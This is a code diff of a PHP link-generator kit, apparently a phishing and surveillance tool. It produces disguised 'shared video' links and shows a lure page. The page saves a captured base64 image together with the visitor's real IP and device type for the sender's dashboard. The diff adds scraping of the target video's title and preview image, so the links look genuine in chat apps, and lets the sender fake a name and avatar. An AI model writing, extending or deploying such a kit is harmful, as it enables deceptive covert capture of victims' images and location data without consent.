@@ -20,6 +20,8 @@ try {
         sender_name TEXT,
         sender_avatar TEXT,
         bg_image TEXT,
+        meta_title TEXT,
+        meta_image TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
@@ -36,6 +38,39 @@ try {
     )");
 } catch (Exception $e) {
     die("Database error: " . $e->getMessage());
+}
+
+function fetch_target_meta($url) {
+    $meta = [
+        'title' => 'Watch this shared video on TikTok',
+        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 4);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    $html = curl_exec($ch);
+    curl_close($ch);
+
+    if ($html) {
+        $dom = new DOMDocument();
+        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
+        $xpath = new DOMXPath($dom);
+
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content | //title');
+        if ($titleNodes->length > 0) {
+            $meta['title'] = trim($titleNodes->item(0)->nodeValue);
+        }
+
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
+        if ($imageNodes->length > 0) {
+            $meta['image'] = trim($imageNodes->item(0)->nodeValue);
+        }
+    }
+    return $meta;
 }
 
 function get_real_ip() {
@@ -75,11 +110,7 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
-$target_redirect = "";
-$sender_name = "User";
-$sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
-$bg_image_url = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
-
+// معالجة زيارة الرابط
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -90,10 +121,11 @@ if (isset($_GET['r'])) {
         $target_redirect = $link['target_url'];
         $sender_name = $link['sender_name'];
         $sender_avatar = $link['sender_avatar'];
-        if (!empty($link['bg_image'])) {
-            $bg_image_url = $link['bg_image'];
-        }
+        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $link['meta_image'];
+        $meta_title = $link['meta_title'];
+        $meta_image = $link['meta_image'];
 
+        // إذا كان الطلب استعلام معاينة من منصات التواصل أو المتصفح
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
@@ -111,63 +143,20 @@ if (isset($_GET['r'])) {
             }
             exit('OK');
         }
-    } else {
-        die("Link not found.");
-    }
-}
-
-$generated_link = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
-    $target_url = trim($_POST['target_url']);
-    $sender_name = trim($_POST['sender_name']) ?: "User";
-    
-    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
-        $target_url = "https://" . $target_url;
-    }
-
-    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
-        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
-        $sender_avatar = $upload_dir . $avatarName;
-    } elseif (!empty($_POST['sender_avatar_url'])) {
-        $sender_avatar = trim($_POST['sender_avatar_url']);
-    }
-
-    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
-        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
-        $bgName = 'bg_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
-        $bg_image_url = $upload_dir . $bgName;
-    } elseif (!empty($_POST['bg_image_url'])) {
-        $bg_image_url = trim($_POST['bg_image_url']);
-    }
-
-    $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image) VALUES (?, ?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url]);
-
-    $domain = $_SERVER['HTTP_HOST'];
-    $generated_link = "https://" . $domain . "/?r=" . $code;
-}
-
-$filter_code = trim($_GET['track'] ?? '');
-if (!empty($filter_code)) {
-    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
-    $stmt->execute([$filter_code]);
-    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
-} else {
-    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
-}
-
-if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch Video</title>
+    <title><?php echo htmlspecialchars($meta_title); ?></title>
+    <!-- وسوم المعاينة لتظهر الصورة والعنوان في تطبيقات الدردشة -->
+    <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
+    <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
+    <meta property="og:type" content="video.other">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="<?php echo htmlspecialchars($meta_title); ?>">
+    <meta name="twitter:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
@@ -293,8 +282,65 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 </body>
 </html>
 <?php 
-    exit(); 
-endif; 
+        exit();
+    } else {
+        die("Link not found.");
+    }
+}
+
+// إنشاء رابط جديد
+$generated_link = "";
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
+    $target_url = trim($_POST['target_url']);
+    $sender_name = trim($_POST['sender_name']) ?: "User";
+    
+    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
+        $target_url = "https://" . $target_url;
+    }
+
+    // جلب ميتاداتا الرابط المستهدف تلقائياً (العنوان والصورة)
+    $scraped_meta = fetch_target_meta($target_url);
+    $meta_title = !empty($_POST['custom_title']) ? trim($_POST['custom_title']) : $scraped_meta['title'];
+    $meta_image = !empty($_POST['custom_image_url']) ? trim($_POST['custom_image_url']) : $scraped_meta['image'];
+
+    // رفع صورة الحساب
+    $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
+    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
+        $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
+        $avatarName = 'avatar_' . uniqid() . '.' . $ext;
+        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
+        $sender_avatar = $upload_dir . $avatarName;
+    } elseif (!empty($_POST['sender_avatar_url'])) {
+        $sender_avatar = trim($_POST['sender_avatar_url']);
+    }
+
+    // رفع صورة الخلفية
+    $bg_image_url = "";
+    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
+        $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
+        $bgName = 'bg_' . uniqid() . '.' . $ext;
+        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
+        $bg_image_url = $upload_dir . $bgName;
+    } elseif (!empty($_POST['bg_image_url'])) {
+        $bg_image_url = trim($_POST['bg_image_url']);
+    }
+
+    $code = substr(md5(uniqid(rand(), true)), 0, 7);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url, $meta_title, $meta_image]);
+
+    $domain = $_SERVER['HTTP_HOST'];
+    $generated_link = "https://" . $domain . "/?r=" . $code;
+}
+
+$filter_code = trim($_GET['track'] ?? '');
+if (!empty($filter_code)) {
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt->execute([$filter_code]);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} else {
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -362,21 +408,23 @@ endif;
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Custom Link</h2>
+            <h2>Generate Preview-Supported Link</h2>
             <form method="POST" enctype="multipart/form-data" class="form-grid">
-                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. YouTube)..." required>
+                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. TikTok / YouTube video)..." required>
                 <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
+                <input type="text" name="custom_title" placeholder="Custom Preview Title (Optional, auto-scraped if empty)">
+                <input type="text" name="custom_image_url" placeholder="Custom Preview Image URL (Optional)...">
                 
                 <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image (Upload file OR paste URL below):</label>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
                     <input type="file" name="avatar_file" accept="image/*">
-                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar Image URL..." style="margin-top: 6px;">
+                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar URL..." style="margin-top: 6px;">
                 </div>
 
                 <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Upload file OR paste URL below):</label>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image:</label>
                     <input type="file" name="bg_file" accept="image/*">
-                    <input type="text" name="bg_image_url" placeholder="Or paste Background Image URL..." style="margin-top: 6px;">
+                    <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
                 </div>
 
                 <button type="submit" name="create" class="btn">Generate Link</button>
